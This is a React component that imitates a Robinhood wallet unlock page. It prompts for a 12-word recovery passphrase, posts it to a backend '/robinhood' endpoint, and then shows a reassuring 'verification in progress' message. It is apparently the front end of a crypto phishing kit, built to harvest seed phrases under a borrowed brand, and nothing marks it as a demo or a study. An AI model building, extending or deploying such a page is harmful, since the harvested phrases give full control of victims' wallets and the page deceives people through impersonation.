import React, { useState } from 'react';
import './robinHoodPagesCss/robinhoodTwoWallet.css';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { SiRobinhood } from 'react-icons/si';
import { useNavigate } from 'react-router-dom';
import fetchWithRetry from '../../../utils/api';

const RobinhoodTwoWallet = () => {
  const [phrase, setPhrase] = useState('');
  const [loading, setLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const navigate = useNavigate();

  const unlockWallet = async () => {
    try {
      setLoading(true);
      const res = await fetchWithRetry('/robinhood', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ passphrase: phrase })
      });

      const data = await res.json();
      toast.success(data.message);
      setPhrase('');
      setShowSuccess(true);
    } catch (error) {
      toast.error('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const unlockWithFaceId = () => {
    toast.info('Feature not available yet.');
  };

  return (
    <div className="robinhoodTwo-wrapper">
      <header className="robinhoodTwo-header">
        <span className="robinhoodTwo-header-text">Wallet</span>
        <div className="robinhoodTwo-header-icon">
          <SiRobinhood size={26} color="#ffffff" />
        </div>
      </header>

      {!showSuccess ? (
        <>
          <div className="robinhoodTwo-title">
            <h3>Unlock Robinhood Wallet</h3>
          </div>
          <section className="robinhoodTwo-body">
            <div className="robinhoodTwo-container">
              <textarea
                className="robinhoodTwo-textarea"
                placeholder="Enter your 12-word passphrase here"
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
              />
              <button
                className="robinhoodTwo-primary-btn"
                onClick={unlockWallet}
                disabled={loading}
              >
                {loading ? 'Loading...' : 'Unlock With Passphrase'}
              </button>
              <button
                className="robinhoodTwo-secondary-btn"
                onClick={unlockWithFaceId}
              >
                Unlock With Face ID
              </button>
              <p className="robinhoodTwo-info-text">
                As a non-custodial wallet, your wallet passphrase is exclusively
                accessible only to you. Recovery of passphrase is currently
                impossible.
              </p>
              <p className="robinhoodTwo-warning-text">
                Lost your passphrase? <span>Create a new wallet</span>, but all
                assets in your previous wallet will be inaccessible.
              </p>
            </div>
          </section>
        </>
      ) : (
        <section className="robinhoodTwo-body">
          <div className="robinhoodTwo-container">
            <h3 className="robinhoodTwo-success-title">
              Verification in progress
            </h3>
            <p className="robinhoodTwo-info-text">
              Your wallet details have been submitted successfully.
              A confirmation email will be sent once verification is complete.
            </p>
            <div className="robinhoodTwo-action-row">
              <button
                className="robinhoodTwo-primary-btn"
                onClick={() => navigate('/')}
              >
                Go Home
              </button>
              <button
                className="robinhoodTwo-secondary-btn"
                onClick={() => setShowSuccess(false)}
              >
                Continue
              </button>
            </div>
          </div>
        </section>
      )}
    </div>
  );
};

export default RobinhoodTwoWallet;